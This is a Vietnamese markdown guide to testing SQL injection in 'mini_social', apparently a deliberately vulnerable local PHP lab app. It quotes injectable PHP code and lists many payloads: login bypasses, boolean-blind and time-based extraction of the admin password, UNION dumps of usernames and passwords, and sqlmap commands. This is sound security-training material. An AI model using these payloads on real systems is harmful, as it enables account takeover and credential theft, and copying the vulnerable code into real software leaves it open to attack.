# 🎯 SQL Injection Vulnerabilities & Test Payloads - mini_social

## 📍 **4 Điểm có lỗ hổng SQL Injection:**

---

## ✅ **1. BOOLEAN-BASED BLIND SQLi - TrackingId Cookie (home.php line 16-32)**

### **Lỗ hổng:**
```php
$tracking_id = $_COOKIE['TrackingId'];
$check_sql = "SELECT * FROM tracking WHERE TrackingId = '" . $tracking_id . "'";
$check_result = $config->query($check_sql);

$sql = "SELECT * FROM tracking WHERE TrackingId = '" . $tracking_id . "'";
$result = $config->query($sql);
```

**Kiểu:** Boolean-based Blind SQLi (giống PortSwigger Lab)

### **Cách test:**

#### **Test 1: Kiểm tra SQLi tồn tại**
```
TrackingId=xyz' AND '1'='1
```
**Kỳ vọng:** Trang hoạt động bình thường (Welcome back!)

```
TrackingId=xyz' AND '1'='2
```
**Kỳ vọng:** Trang hoạt động khác (Welcome!)

#### **Test 2: Xác định tồn tại bảng users**
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

#### **Test 3: có user administrator trong users*
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

#### **Test 4: kiểm tra mật khẩu độ dài > 1**
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

#### **Test 5: Test từng ký tự của password**
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```


### **Cách thực hiện:**
1. Mở DevTools (F12) → Application → Cookies
2. Tìm cookie `TrackingId`
3. Sửa giá trị thành payload
4. Refresh trang
5. Quan sát thay đổi

---

## ✅ **3. AUTHENTICATION BYPASS SQLi - Login Form (index.php line 36)**

### **Lỗ hổng:**
```php
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = '" . $username . "' AND password = '" . $password . "'";
$result = $config->query($sql);
```

**Kiểu:** Authentication Bypass SQLi

### **Cách test:**

#### **Payload 1: Basic bypass với comment**
```
Username: admin'--
Password: anything
```
**SQL:** `SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'anything'`

#### **Payload 2: OR 1=1**
```
Username: admin' OR '1'='1
Password: admin' OR '1'='1
```

#### **Payload 3: OR 1=1 với comment**
```
Username: ' OR 1=1--
Password: anything
```

#### **Payload 4: UNION-based**
```
Username: ' UNION SELECT 1,2,3,4,5--
Password: anything
```

#### **Payload 5: Always true**
```
Username: administrator' OR '1'='1'--
Password: anything
```

#### **Payload 6: Extract data trong login**
```
Username: ' UNION SELECT NULL,NULL,NULL,password,NULL FROM users WHERE username='administrator'--
Password: (nhập password lấy được)
```

---

## ✅ **4. TIME-BASED BLIND SQLi - Username Check (index.php line 40-44)**

### **Lỗ hổng:**
```php
$sqlUser = "SELECT id, username, role, password FROM users WHERE username = '" . $username . "'";
$resultUser = $config->query($sqlUser);
if ($resultUser && $resultUser->num_rows > 0) {
    $delay = min(strlen($password) * 10000, 800000);
    usleep($delay);
}
```

**Kiểu:** Time-based Blind SQLi + Timing Attack

### **Cách test:**

#### **Test 1: Confirm SQLi với SLEEP**
```
Username: admin' AND SLEEP(5)--
Password: anything
```
**Kỳ vọng:** Response chậm 5 giây

#### **Test 2: Boolean-based với time delay**
```
Username: admin' AND IF(1=1,SLEEP(5),0)--
```
**True:** Delay 5s

```
Username: admin' AND IF(1=2,SLEEP(5),0)--
```
**False:** No delay

#### **Test 3: Extract database name char by char**
```
Username: admin' AND IF(SUBSTRING(database(),1,1)='m',SLEEP(3),0)--
```
Thử từng ký tự: a,b,c...z cho đến khi có delay

#### **Test 4: Extract username length**
```
Username: ' AND IF(LENGTH((SELECT username FROM users WHERE id=1))=5,SLEEP(3),0)--
```

#### **Test 5: Extract password char by char**
```
Username: admin' AND IF(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a',SLEEP(3),0)--
```

#### **Test 6: Check if user exists**
```
Username: admin' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')>0,SLEEP(3),0)--
```

---

## 🎯 **QUICK TEST PAYLOADS:**

### **1. Cookie SQLi (TrackingId):**
```
xyz' UNION SELECT username,password FROM users--
```

### **2. Filter SQLi:**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT username,password FROM users--
```

### **3. Login Bypass:**
```
Username: admin'--
Password: anything
```

### **4. Time-based:**
```
Username: admin' AND SLEEP(5)--
Password: anything
```

---

## 🛠️ **TOOLS ĐỂ TEST SQLi:**

### **1. Manual Testing:**
- Browser DevTools (Edit cookies)
- Burp Suite (Intercept & modify requests)

### **2. Automated Tools:**
```bash
# sqlmap - Cookie SQLi
sqlmap -u "http://localhost/mini_social/home.php" --cookie="TrackingId=xyz" -p TrackingId --dbs

# sqlmap - Filter SQLi
sqlmap -u "http://localhost/mini_social/home.php?filter=test" -p filter --dbs

# sqlmap - Login SQLi
sqlmap -u "http://localhost/mini_social/index.php" --data="username=test&password=test" -p username --dbs
```

---

## 📋 **CHECKLIST TEST SQLi:**

### **Cookie SQLi (TrackingId):**
- [ ] Test với `'` → Check error
- [ ] Test với `' AND '1'='1` → True condition
- [ ] Test với `' AND '1'='2` → False condition  
- [ ] Test UNION: `' UNION SELECT NULL,NULL--`
- [ ] Extract users: `' UNION SELECT username,password FROM users--`

### **Filter SQLi:**
- [ ] Test với `?filter='` → Check error
- [ ] Test UNION: `?filter=' UNION SELECT 'a','b'--`
- [ ] Extract database: `?filter=' UNION SELECT database(),version()--`
- [ ] Extract users: `?filter=' UNION SELECT username,password FROM users--`

### **Login SQLi:**
- [ ] Bypass với `admin'--`
- [ ] Bypass với `' OR 1=1--`
- [ ] Test time-based: `admin' AND SLEEP(5)--`

---

## 🔥 **BEST PAYLOADS ĐỂ EXTRACT DATA:**

### **Get all users & passwords:**

**Cookie:**
```
TrackingId=xyz' UNION SELECT CONCAT(username,':',password),NULL FROM users--
```

**Filter:**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT username,password FROM users--
```

### **Get admin password:**

**Cookie:**
```
TrackingId=xyz' UNION SELECT password,NULL FROM users WHERE role='admin'--
```

**Filter:**
```
http://localhost/mini_social/home.php?filter=' UNION SELECT password,'admin' FROM users WHERE role='admin'--
```

---

## 💡 **TIPS:**

1. **URL Encode payloads** nếu gửi qua URL
2. **Dùng Burp Suite** để dễ test và modify requests
3. **Check response time** cho time-based attacks
4. **Quan sát error messages** để xác định database type
5. **Thử nhiều comment syntax:** `--`, `#`, `/* */`


